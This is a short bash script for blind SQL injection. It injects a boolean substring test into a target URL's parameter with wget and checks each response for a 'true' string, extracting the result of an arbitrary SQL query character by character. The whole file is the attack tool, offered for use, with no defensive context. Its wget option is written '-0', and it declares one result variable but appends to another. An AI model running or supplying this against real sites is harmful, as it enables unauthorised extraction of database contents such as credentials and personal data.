#!/bin/bash

charset=`echo {0..9} {A..z} \. \: \, \; \- \_ \@`


export URL=$1
export truestring=$2
export maxlenght=$3
export query=$4

export results=""



if [ $# -eq 0 ]
	then
		echo "script usage: ./blind_injection.sh http://your.link" 
else
	echo "your link is: $1"
	echo "your truestring is: $2"
	echo "your maxlenght is: $3"
	echo "your query is: $4"
fi

echo "Working..."

for ((j=1;j<maxlenght;j+=1))
do
	export nthchar=$j
	
	for i in $charset
	do
		wget "$URL' and substring(($query),$nthchar,1)='$i" -q -0 - |grep "$truestring" &> /dev/null
		if [ "$?" == "0" ]
		then
			echo Character number $nthchar found: $i
			export result+=$i
			break
		fi
	done
done

echo Result: $result

